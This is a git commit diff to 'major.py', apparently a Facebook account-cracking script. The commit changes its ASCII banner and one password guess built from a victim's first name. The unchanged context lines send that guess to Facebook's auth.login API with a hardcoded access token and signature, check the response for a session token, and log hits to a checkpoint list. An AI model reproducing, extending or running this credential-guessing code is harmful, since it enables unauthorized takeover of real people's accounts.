2cd3cb86ff1a576002f73fc3a368bfbdb84cfe7d
x4l4dyar <74417803+x4l4dyar@users.noreply.github.com>
2020-12-05 20:49:28 +0300

    Update major.py

--- major.py
+++ major.py
@@ -74,13 +74,13 @@ def anime(z):
 logo = """
 
 
-##     ##    ###          ##  #######  ########  
-###   ###   ## ##         ## ##     ## ##     ## 
-#### ####  ##   ##        ## ##     ## ##     ## 
-## ### ## ##     ##       ## ##     ## ########  
-##     ## ######### ##    ## ##     ## ##   ##   
-##     ## ##     ## ##    ## ##     ## ##    ##  
-##     ## ##     ##  ######   #######  ##     ## 
+
+███╗░░░███╗░█████╗░░░░░░██╗░█████╗░██████╗░
+████╗░████║██╔══██╗░░░░░██║██╔══██╗██╔══██╗
+██╔████╔██║███████║░░░░░██║██║░░██║██████╔╝
+██║╚██╔╝██║██╔══██║██╗░░██║██║░░██║██╔══██╗
+██║░╚═╝░██║██║░░██║╚█████╔╝╚█████╔╝██║░░██║
+╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝
 
 
 
@@ -425,7 +425,7 @@ def startgrab():
                                     cek.close()
                                     cekpoint.append(user + pass6)
                                 else:
-                                    pass7 = b['first_name'] + '112233'
+                                    pass7 = b['first_name'] + '1122'
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
